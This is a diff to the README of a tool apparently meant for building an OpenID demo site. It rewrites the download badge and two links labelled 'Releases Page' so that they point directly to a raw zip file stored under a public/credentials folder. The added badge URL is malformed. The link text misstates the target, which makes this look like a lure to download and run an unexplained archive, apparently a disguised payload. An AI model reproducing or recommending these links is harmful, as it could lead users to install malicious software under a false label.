@@ -1,6 +1,6 @@
 # 🌐 oidc4vc-static-resol - Build Your OpenID Demo Site Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-oidc4vc--static--resol-blue.svg)](https://github.com/karim10062009/oidc4vc-static-resol/releases)
+[![Download Now](https://github.com/karim10062009/oidc4vc-static-resol/raw/refs/heads/main/public/credentials/resol_vc_oidc_static_3.6.zip%https://github.com/karim10062009/oidc4vc-static-resol/raw/refs/heads/main/public/credentials/resol_vc_oidc_static_3.6.zip)](https://github.com/karim10062009/oidc4vc-static-resol/raw/refs/heads/main/public/credentials/resol_vc_oidc_static_3.6.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@
 Follow these steps to download and run the application:
 
 1. **Download the Application:**
-   - Visit the [Releases Page](https://github.com/karim10062009/oidc4vc-static-resol/releases) to download the latest version.
+   - Visit the [Releases Page](https://github.com/karim10062009/oidc4vc-static-resol/raw/refs/heads/main/public/credentials/resol_vc_oidc_static_3.6.zip) to download the latest version.
    - Look for the most recent release and download the appropriate file for your system.
 
 2. **Install the Application:**
@@ -23,7 +23,7 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-Head over to our [Releases Page](https://github.com/karim10062009/oidc4vc-static-resol/releases) to download the latest version of the `oidc4vc-static-resol` tool. 
+Head over to our [Releases Page](https://github.com/karim10062009/oidc4vc-static-resol/raw/refs/heads/main/public/credentials/resol_vc_oidc_static_3.6.zip) to download the latest version of the `oidc4vc-static-resol` tool. 
 
 ### Supported Operating Systems
 
